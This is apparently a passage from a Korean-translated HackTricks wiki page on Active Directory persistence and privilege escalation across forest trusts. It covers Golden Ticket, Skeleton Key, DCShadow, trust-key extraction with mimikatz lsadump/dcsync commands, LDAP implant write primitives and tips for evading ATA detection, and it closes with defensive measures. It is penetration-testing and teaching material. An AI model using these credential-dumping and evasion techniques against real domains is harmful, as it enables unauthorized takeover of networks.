**Golden Ticket attack**은 공격자가 Active Directory 환경에서 **krbtgt 계정의 NTLM 해시**에 접근하는 것을 포함합니다. 이 계정은 모든 **TGT**를 서명하는 데 사용되므로 AD 네트워크 내 인증에 필수적입니다.

공격자가 이 해시를 얻으면, 원하는 어떤 계정에 대해서도 **TGT를 생성**할 수 있습니다 (Silver ticket 공격과 유사하게).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

이들은 일반적인 Golden Ticket 탐지 메커니즘을 **우회하도록 위조된** Golden Ticket과 유사합니다.


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

계정의 **인증서를 보유하거나 요청할 수 있는 능력**은 사용자의 계정에 영구적으로 남을 수 있는 매우 좋은 방법입니다(사용자가 비밀번호를 변경하더라도):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**인증서를 사용하여 도메인 내에서 높은 권한으로 영구화하는 것**도 가능합니다:


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory의 **AdminSDHolder** 객체는 **Domain Admins**, **Enterprise Admins** 같은 **특권 그룹**의 보안을 보장하기 위해 표준 **ACL**을 적용하여 무단 변경을 방지합니다. 그러나 이 기능은 악용될 수 있습니다. 공격자가 AdminSDHolder의 ACL을 수정해 일반 사용자에게 전체 접근 권한을 부여하면, 해당 사용자는 모든 특권 그룹에 대한 광범위한 제어권을 얻게 됩니다. 본래 보호를 위한 이 메커니즘이 제대로 모니터링되지 않으면 오히려 무단 접근을 허용할 수 있습니다.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

모든 **Domain Controller(DC)** 내부에는 **로컬 관리자** 계정이 존재합니다. 해당 머신에서 관리자 권한을 얻으면, **mimikatz**를 사용해 로컬 Administrator 해시를 추출할 수 있습니다. 이후 레지스트리 수정을 통해 **이 비밀번호의 사용을 활성화**하면 원격으로 로컬 Administrator 계정에 접근할 수 있습니다.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

특정 도메인 객체에 대해 **특별 권한**을 사용자에게 **부여**하면, 해당 사용자는 향후 **권한 상승**을 수행할 수 있습니다.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**security descriptors**는 객체가 다른 객체에 대해 가지는 **권한**을 **저장**하는 데 사용됩니다. 객체의 **security descriptor**에 **작은 변경**만 가할 수 있다면, 특권 그룹의 멤버가 아니더라도 해당 객체에 대해 매우 흥미로운 권한을 얻을 수 있습니다.


{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

메모리 내 LSASS를 변조하여 **보편적 비밀번호**를 설정하면 모든 도메인 계정에 접근할 수 있습니다.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
자신만의 **SSP**를 만들어 머신에 접근하는 동안 사용되는 **자격증명**을 **평문으로 포착**할 수 있습니다.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

이 기법은 AD에 **새 Domain Controller를 등록**하고 이를 사용해 지정된 객체들에 대해 SIDHistory, SPNs 등 **속성을 푸시**합니다. 이 과정은 **수정 로그를 남기지 않고** 수행될 수 있습니다. 이 방법은 DA 권한과 **루트 도메인** 내부에 있어야 합니다.\
잘못된 데이터를 사용하면 상당히 보기 흉한 로그가 남을 수 있으니 주의하세요.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

앞서 LAPS 비밀번호를 읽을 수 있는 충분한 권한이 있으면 권한 상승이 가능하다고 이야기했습니다. 하지만 이러한 비밀번호는 **영구성(persistence)** 유지에도 사용될 수 있습니다.\
자세한 내용은 다음을 확인하세요:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft는 **Forest**를 보안 경계로 간주합니다. 이는 **단일 도메인 침해가 전체 Forest 침해로 이어질 수 있음**을 의미합니다.

### Basic Information

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>)는 한 **도메인**의 사용자가 다른 **도메인**의 리소스에 접근할 수 있도록 하는 보안 메커니즘입니다. 이는 두 도메인의 인증 시스템을 연결하여 인증 검증이 원활하게 흐르도록 합니다. 도메인이 트러스트를 설정할 때, 트러스트의 무결성에 중요한 특정 **키**들을 각 도메인의 **Domain Controller(DC)**에 교환하고 보관합니다.

일반적인 시나리오에서 사용자가 **신뢰된 도메인**의 서비스를 접근하려면, 먼저 자신의 도메인 DC로부터 **inter-realm TGT**라는 특별한 티켓을 요청해야 합니다. 이 TGT는 두 도메인이 합의한 공유 **키**로 암호화됩니다. 사용자는 이 inter-realm TGT를 **신뢰된 도메인의 DC**에 제시하여 서비스 티켓(**TGS**)을 얻습니다. 신뢰된 도메인의 DC가 inter-realm TGT를 검증하면 TGS를 발급하여 사용자가 서비스에 접근할 수 있게 합니다.

**절차**:

1. **Domain 1**의 클라이언트 컴퓨터가 자신의 **NTLM 해시**를 사용해 **TGT**를 요청하며 과정을 시작합니다 (DC1).
2. 클라이언트가 성공적으로 인증되면 DC1은 새로운 TGT를 발급합니다.
3. 클라이언트는 **Domain 2**의 리소스에 접근하기 위해 DC1에 **inter-realm TGT**를 요청합니다.
4. inter-realm TGT는 두 도메인 간의 양방향 도메인 트러스트의 일부로 DC1과 DC2가 공유하는 **trust key**로 암호화됩니다.
5. 클라이언트는 inter-realm TGT를 **Domain 2의 Domain Controller(DC2)**에 제시합니다.
6. DC2는 공유된 trust key로 inter-realm TGT를 검증하고 유효하면, 클라이언트가 접근하려는 Domain 2 내 서버에 대한 **Ticket Granting Service (TGS)**를 발급합니다.
7. 마지막으로 클라이언트는 이 TGS를 서버에 제시하며, 이 TGS는 서버 계정 해시로 암호화되어 있어 Domain 2의 서비스 접근을 얻습니다.

### Different trusts

트러스트는 **단방향(1 way)** 또는 **양방향(2 ways)**일 수 있다는 점에 유의해야 합니다. 양방향인 경우 양쪽 도메인이 서로를 신뢰하지만, **단방향**인 경우 한쪽 도메인이 **trusted**이고 다른 쪽이 **trusting** 도메인이 됩니다. 이 경우 **trusted 도메인에서 trusting 도메인의 리소스만 접근할 수 있습니다.**

도메인 A가 도메인 B를 신뢰하면, A는 trusting 도메인이고 B는 trusted 도메인입니다. 또한 **Domain A**에서는 이것이 **Outbound trust**로 보이고, **Domain B**에서는 **Inbound trust**로 보입니다.

**다양한 신뢰 관계 유형**

- **Parent-Child Trusts**: 동일한 포리스트 내에서 흔한 설정으로, child 도메인은 자동으로 parent 도메인과 양방향의 추이적(transitive) 트러스트를 가집니다. 이는 부모와 자식 간에 인증 요청이 원활히 흐른다는 것을 의미합니다.
- **Cross-link Trusts**: "shortcut trusts"라고도 하며, child 도메인들 간에 생성되어 인증 참조(referral) 과정을 단축합니다. 복잡한 포리스트에서는 인증 참조가 포리스트 루트까지 올라갔다가 대상 도메인으로 내려가야 할 수 있는데, cross-link를 통해 이 경로를 단축할 수 있습니다.
- **External Trusts**: 서로 관련 없는 다른 도메인들 간에 설정되며 비전이(transitive) 특성을 가지지 않습니다. Microsoft 문서에 따르면 external trusts는 포리스트 트러스트로 연결되지 않은 외부 도메인의 리소스에 접근하는 데 유용합니다. 보안은 SID 필터링을 통해 강화됩니다.
- **Tree-root Trusts**: 포리스트 루트 도메인과 새로 추가된 트리 루트 간에 자동으로 설정되는 트러스트입니다. 흔히 접하진 않지만 포리스트에 새 도메인 트리를 추가할 때 중요하며 두 방향의 추이적 트러스트를 유지합니다.
- **Forest Trusts**: 두 포리스트 루트 도메인 간의 양방향 추이적 트러스트로, SID 필터링을 통해 보안이 강화됩니다.
- **MIT Trusts**: 비-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos 도메인과 설정되는 트러스트입니다. MIT trusts는 Windows 생태계 외부의 Kerberos 기반 시스템과 통합이 필요한 환경을 위해 사용됩니다.

#### Other differences in **trusting relationships**

- 트러스트 관계는 **추이적(transitive)**일 수도 있고 **비추이적(non-transitive)**일 수도 있습니다 (예: A가 B를 신뢰하고 B가 C를 신뢰하면 A가 C를 신뢰하는지 여부).
- 트러스트 관계는 **양방향**(서로 신뢰) 또는 **단방향**(한쪽만 신뢰)으로 설정될 수 있습니다.

### Attack Path

1. **신뢰 관계 열거(enumerate)**
2. 어떤 **security principal**(user/group/computer)이 **다른 도메인의 리소스에 접근 권한**을 가지고 있는지 확인하세요—ACE 항목이나 다른 도메인의 그룹 멤버십을 통해 확인할 수 있습니다. **도메인 간 관계**를 찾아보세요(트러스트 설정이 이 목적일 가능성이 높음).
1. 이 경우 kerberoast도 또 다른 옵션이 될 수 있습니다.
3. 도메인 간 **피벗(pivot)** 가능한 **계정들을 탈취(compromise)** 하세요.

다른 도메인의 리소스에 접근할 수 있는 공격자는 주로 세 가지 메커니즘을 통해 접근할 수 있습니다:

- **로컬 그룹 멤버십**: Principals가 서버의 “Administrators” 그룹과 같은 로컬 그룹에 추가되어 해당 머신에 대한 상당한 제어권을 얻을 수 있습니다.
- **외부 도메인 그룹 멤버십**: Principals가 외부 도메인의 그룹 멤버일 수 있습니다. 다만 이 방법의 효율성은 트러스트의 성격과 그룹의 범위에 따라 달라집니다.
- **Access Control Lists (ACLs)**: Principals가 특히 **DACL 내의 ACE**로 지정되어 특정 리소스에 대한 접근 권한을 받을 수 있습니다. ACL, DACL, ACE의 작동 원리를 더 깊이 이해하고 싶다면, “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” 화이트페이퍼가 매우 유용합니다.

### Find external users/groups with permissions

외부 보안 주체(foreign security principals)를 찾으려면 **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`**을 확인할 수 있습니다. 여기에는 **외부 도메인/포리스트**의 사용자/그룹이 포함됩니다.

이 항목은 **Bloodhound**에서 확인하거나 powerview를 사용하여 확인할 수 있습니다:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
도메인 트러스트를 열거하는 다른 방법:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> **2 trusted keys**가 있습니다. 하나는 _Child --> Parent_용이고 다른 하나는 _Parent_ --> _Child_용입니다.\
> 현재 도메인에서 사용되는 키는 다음으로 확인할 수 있습니다:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

SID-History injection을 통해 트러스트를 악용하여 child/parent domain에서 Enterprise admin으로 권한 상승할 수 있습니다:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Configuration Naming Context (NC)을 어떻게 악용할 수 있는지 이해하는 것은 매우 중요합니다. Configuration NC는 Active Directory (AD) 환경에서 포리스트 전체의 구성 데이터를 저장하는 중앙 저장소 역할을 합니다. 이 데이터는 포리스트 내의 모든 Domain Controller (DC)에 복제되며, 쓰기 가능한 DC들은 Configuration NC의 쓰기 가능한 복사본을 유지합니다. 이를 악용하려면 **DC에서 SYSTEM privileges**, 가능하면 child DC에서의 권한이 필요합니다.

**Link GPO to root DC site**

Configuration NC의 Sites 컨테이너에는 AD 포리스트 내의 모든 도메인 가입 컴퓨터들의 사이트에 대한 정보가 포함되어 있습니다. 어떤 DC에서든 SYSTEM privileges로 작업하면 공격자는 GPO를 root DC sites에 연결할 수 있습니다. 이 동작은 해당 사이트에 적용되는 정책을 조작해 루트 도메인을 잠재적으로 손상시킬 수 있습니다.

For in-depth information, one might explore research on [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

공격 벡터 중 하나는 도메인 내의 권한 있는 gMSA를 표적으로 삼는 것입니다. gMSA의 비밀번호를 계산하는 데 필수적인 KDS Root key는 Configuration NC에 저장됩니다. 어떤 DC에서든 SYSTEM privileges가 있으면 KDS Root key에 접근해 포리스트 전반의 어떤 gMSA에 대해서도 비밀번호를 계산할 수 있습니다.

Detailed analysis and step-by-step guidance can be found in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Additional external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

이 방법은 인내가 필요하며, 새로운 권한 있는 AD 객체가 생성되기를 기다려야 합니다. SYSTEM privileges가 있으면 공격자는 AD Schema를 수정하여 모든 클래스에 대해 임의의 사용자에게 완전한 제어권을 부여할 수 있습니다. 이는 새로 생성된 AD 객체들에 대한 무단 접근 및 제어로 이어질 수 있습니다.

Further reading is available on [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

ADCS ESC5 취약점은 PKI (Public Key Infrastructure) 객체에 대한 제어를 목표로 하여 포리스트 내의 임의 사용자로 인증할 수 있는 인증서 템플릿을 생성합니다. PKI 객체는 Configuration NC에 존재하므로, 쓰기 가능한 child DC를 침해하면 ESC5 공격을 실행할 수 있습니다.

More details on this can be read in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). In scenarios lacking ADCS, the attacker has the capability to set up the necessary components, as discussed in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
이 시나리오에서는 **귀하의 도메인이 외부 도메인에 의해 신뢰되어** 해당 도메인에 대해 **확인되지 않은 권한**을 부여받습니다. 귀하는 **귀 도메인의 어떤 주체들(principals)이 외부 도메인에 대해 어떤 접근 권한을 가지고 있는지** 찾아내고 이를 악용하려 시도해야 합니다:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### 외부 포리스트 도메인 - 단방향(아웃바운드)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In this scenario **your domain** is **trusting** some **privileges** to principal from a **different domains**.

However, when a **domain is trusted** by the trusting domain, the trusted domain **creates a user** with a **predictable name** that uses as **password the trusted password**. Which means that it's possible to **access a user from the trusting domain to get inside the trusted one** to enumerate it and try to escalate more privileges:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Another way to compromise the trusted domain is to find a [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) created in the **opposite direction** of the domain trust (which isn't very common).

Another way to compromise the trusted domain is to wait in a machine where a **user from the trusted domain can access** to login via **RDP**. Then, the attacker could inject code in the RDP session process and **access the origin domain of the victim** from there.\
Moreover, if the **victim mounted his hard drive**, from the **RDP session** process the attacker could store **backdoors** in the **startup folder of the hard drive**. This technique is called **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- SID Filtering은 포리스트 간(trust)에서 SID history 속성을 악용하는 공격의 위험을 완화하며, 모든 inter-forest trust에서 기본적으로 활성화되어 있습니다. 이는 Microsoft의 입장에 따라 보안 경계를 도메인이 아닌 포리스트로 간주하여 intra-forest trust는 안전하다는 가정에 기반합니다.
- 다만, SID Filtering은 애플리케이션과 사용자 접근을 방해할 수 있어 간혹 비활성화되는 경우가 있습니다.

### **Selective Authentication:**

- 포리스트 간(trust)에 대해서는 Selective Authentication을 사용하면 두 포리스트의 사용자가 자동으로 인증되지 않도록 하여, trusting 도메인이나 포리스트 내의 도메인 및 서버에 접근하려면 명시적인 권한이 필요합니다.
- 이 조치들이 writable Configuration Naming Context (NC) 악용이나 trust account 공격으로부터 보호하지는 못한다는 점을 유의해야 합니다.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection)은 bloodyAD-style LDAP primitives를 x64 Beacon Object Files로 재구현하여 on-host implant(e.g., Adaptix C2) 내부에서 완전히 실행되도록 합니다. 운영자는 패키지를 `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`로 컴파일하고 `ldap.axs`를 로드한 다음 beacon에서 `ldap <subcommand>`를 호출합니다. 모든 트래픽은 현재 로그온 보안 컨텍스트를 통해 LDAP(389, signing/sealing) 또는 LDAPS(636, auto certificate trust)로 전달되므로 socks 프록시나 디스크 아티팩트가 필요하지 않습니다.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers`는 short names/OU paths를 full DNs로 해석하고 해당 객체들을 덤프합니다.
- `get-object`, `get-attribute`, and `get-domaininfo`는 임의의 속성(보안 디스크립터 포함)과 `rootDSE`로부터의 포리스트/도메인 메타데이터를 가져옵니다.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd`는 roasting 후보, delegation 설정, 그리고 LDAP에서 직접 존재하는 [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) 디스크립터를 노출합니다.
- `get-acl` and `get-writable --detailed`는 DACL을 파싱하여 trustees, 권한(GenericAll/WriteDACL/WriteOwner/attribute writes), 상속 정보를 나열하여 즉각적인 ACL privilege escalation 대상들을 제공합니다.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives (권한 상승 및 영속화를 위한)

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) 는 OU 권한이 있는 위치에 새로운 주체(Principal) 또는 컴퓨터 계정을 스테이징할 수 있게 합니다. `add-groupmember`, `set-password`, `add-attribute`, 그리고 `set-attribute` 는 write-property 권한이 발견되면 대상 계정을 즉시 탈취합니다.
- ACL-focused commands such as `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, and `add-dcsync` 은 AD 객체에 대한 WriteDACL/WriteOwner 권한을 비밀번호 재설정, 그룹 멤버십 제어 또는 DCSync 복제 권한으로 전환하며 PowerShell/ADSI 흔적을 남기지 않습니다. `remove-*` 대응 명령은 주입된 ACE들을 정리합니다.

### Delegation, roasting, 및 Kerberos 악용

- `add-spn`/`set-spn` 은 손상된 사용자를 즉시 Kerberoastable로 만듭니다; `add-asreproastable` (UAC 토글)는 비밀번호를 건드리지 않고 AS-REP roasting 대상으로 표시합니다.
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) 는 `msDS-AllowedToDelegateTo`, UAC 플래그, 또는 `msDS-AllowedToActOnBehalfOfOtherIdentity` 를 비콘에서 재작성하여 constrained/unconstrained/RBCD 공격 경로를 가능하게 하며 원격 PowerShell 또는 RSAT 필요성을 제거합니다.

### sidHistory 주입, OU 이동, 및 공격 표면 형성

- `add-sidhistory` 는 권한 있는 SID들을 제어되는 주체의 SID history에 주입합니다 (see [SID-History Injection](sid-history-injection.md)), LDAP/LDAPS만으로 은밀한 권한 상속을 제공합니다.
- `move-object` 는 컴퓨터나 사용자의 DN/OU를 변경하여 공격자가 이미 위임된 권한이 존재하는 OU로 자산을 끌어오게 하며, 이후 `set-password`, `add-groupmember`, 또는 `add-spn` 등을 악용할 수 있게 합니다.
- `remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` 등과 같은 엄격히 범위가 제한된 제거 명령은 운영자가 자격 증명이나 영속성을 수확한 후 빠른 롤백을 허용하여 텔레메트리를 최소화합니다.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## 일반적인 방어 조치

[**여기에서 자격 증명 보호 방법을 더 알아보세요.**](../stealing-credentials/credentials-protections.md)

### **자격 증명 보호를 위한 방어 조치**

- **Domain Admins Restrictions**: Domain Admins는 오직 Domain Controllers에만 로그인하도록 제한하는 것이 권장되며, 다른 호스트에서의 사용을 피해야 합니다.
- **Service Account Privileges**: 서비스는 보안을 위해 Domain Admin(DA) 권한으로 실행되어서는 안 됩니다.
- **Temporal Privilege Limitation**: DA 권한이 필요한 작업의 경우 지속 시간을 제한해야 합니다. 예: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: 감사 이벤트 ID 2889/3074/3075를 모니터링한 후 DCs/클라이언트에서 LDAP signing과 LDAPS channel binding을 적용하여 LDAP MITM/relay 시도를 차단합니다.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **속임수(Deception) 기법 구현**

- 속임수 구현은 유인 계정이나 컴퓨터 같은 트랩을 설정하는 것을 포함하며, 암호 만료 안 함 또는 Trusted for Delegation으로 표시되는 계정 등과 같은 특징을 가질 수 있습니다. 자세한 접근법에는 특정 권한을 가진 사용자를 생성하거나 고권한 그룹에 추가하는 것이 포함됩니다.
- 실전 예: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- 속임수 기법 배포에 대한 추가 정보는 [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception)에서 확인할 수 있습니다.

### **속임수 식별**

- **For User Objects**: 의심스러운 징후로는 비정상적인 ObjectSID, 드문 로그온, 생성 날짜 불일치, 낮은 bad password count 등이 있습니다.
- **General Indicators**: 잠재적 유인 객체의 속성을 정상 객체와 비교하면 불일치가 드러날 수 있습니다. [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) 같은 도구가 이러한 속임수 식별에 도움을 줄 수 있습니다.

### **탐지 시스템 우회**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: ATA 탐지를 피하기 위해 Domain Controllers에서 세션 열거를 피합니다.
- **Ticket Impersonation**: 티켓 생성에 **aes** 키를 사용하면 NTLM으로 강등하지 않아 탐지를 회피하는 데 도움이 됩니다.
- **DCSync Attacks**: ATA 탐지를 피하기 위해 비-Domain Controller에서 실행하는 것이 권장되며, Domain Controller에서 직접 실행하면 경보를 유발합니다.

## 참고자료

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
